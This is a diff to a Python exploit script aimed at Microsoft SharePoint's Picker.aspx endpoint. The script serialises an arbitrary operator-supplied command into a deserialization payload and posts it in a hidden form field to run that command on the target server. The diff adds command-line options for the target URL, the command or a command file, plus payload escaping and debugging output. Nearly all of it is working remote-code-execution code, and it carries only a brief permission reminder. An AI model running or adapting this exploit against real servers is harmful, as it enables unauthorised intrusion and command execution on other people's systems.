@@ -6,6 +6,9 @@ import sys
 from xml.sax.saxutils import escape
 from lxml import html
 import codecs
+import readline
+from clint.arguments import Args
+import signal
 
 def serialize_command(cmd):
     total = ""
@@ -14,6 +17,62 @@ def serialize_command(cmd):
         b = codecs.encode(a,"hex").decode('ascii')
         total += b[::-1]
     return total
+
+def deserialize_command(cmd):
+    length = len(cmd)
+    s = ""
+    for i in range(0,length,4):
+        character = cmd[i]+cmd[i+1]+cmd[i+2]+cmd[i+3]
+        character = character[::-1]
+        c_hex = codecs.decode(character,"hex")
+        a = codecs.decode(c_hex,"utf-16be")
+        s += a
+		
+    return s
+
+#######################################    
+signal.signal(signal.SIGINT, signal.default_int_handler)
+args = Args()
+
+myargs = dict(args.grouped)
+if '--help' in myargs or '-h' in myargs:
+    help = """
+        desharialize options:
+        -h --help         - This menu
+        -u --url          - The Sharepoint Picker.aspx URL ( e.g. http://localhost/_layouts/15/Picker.aspx )
+        -c --command      - The command to run on the target Sharepoint server.
+        -f --file         - The file containing the command to run (Useful for commands with multi-lines or characters that need escaping)
+        """
+    print (help)
+    exit(0)
+    
+url = ''
+cmd = ''
+filename = ''
+if '--url' in myargs or '-u' in myargs:
+    try:
+        url = myargs['--url'][0]
+    except:
+        url = myargs['-u'][0]
+   
+if '--command' in myargs or '-c' in myargs:
+    if '--file' in myargs or '-f' in myargs:
+        print("Can't use both command and file options at the same time!")
+        exit(0)
+    try:
+        cmd = myargs['--command'][0]
+    except:
+        cmd = myargs['-c'][0]
+
+if '--file' in myargs or '-f' in myargs:
+    try:
+        filename = myargs['--file'][0]
+    except:
+        filename = myargs['-f'][0]
+    file = open(filename,mode='r')
+    cmd = file.read()
+    file.close()
+    
 
 sharepoint2019and2016 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=16.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c";
 sharepoint2013 = "?PickerDialogType=Microsoft.SharePoint.WebControls.ItemPickerDialog,+Microsoft.SharePoint,+Version=15.0.0.0,+Culture=neutral,+PublicKeyToken=71e9bce111e9429c";
@@ -28,8 +87,8 @@ if PY3:
 else:
     string_types = basestring,
 
-
-url = raw_input("Enter the SharePoint Server URL ending with Picker.aspx     :")
+if url == '':
+    url = raw_input("Enter the SharePoint Server URL ending with Picker.aspx:")
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
@@ -72,10 +131,20 @@ except:
     pass
 
 
+if cmd == '':
+    cmd = raw_input("Write your full command here to execute on the test target system (Make sure you have permissions from system owner):")
 
-cmd = raw_input("Write your full command here to execute on the test target system (Make sure you have permissions from system owner):")
 
+#escapedcmd = escape(cmd,html_escape_table)
+cmd = cmd.replace("&","&amp;")
+cmd = cmd.replace(">","&gt;")
+cmd = cmd.replace("<","&lt;")
+cmd = cmd.replace("\"","&quot;")
+cmd = cmd.replace("'","&apos;")
 escapedcmd = escape(cmd)
+
+
+
 
 print(escapedcmd)
 srlcmd = serialize_command(escapedcmd)
@@ -87,7 +156,9 @@ serialized_length = hex_length[::-1]
 payload = payload.replace("e200e200e200140024003400e200e200e200",srlcmd)
 payload = payload.replace("zzzz",serialized_length)
 
+print("Deserialized Payload:")
+print(deserialize_command(payload[8:]))
 data = {"__VIEWSTATE":viewstate,"__EVENTVALIDATION":eventvalidation,"ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData":payload}
 thirdcall = requests.post(FullURL, data=data,headers=headers)
 
-print("Payload launched! Exiting...")
+print("Payload launched! Check execution results. Exiting...")
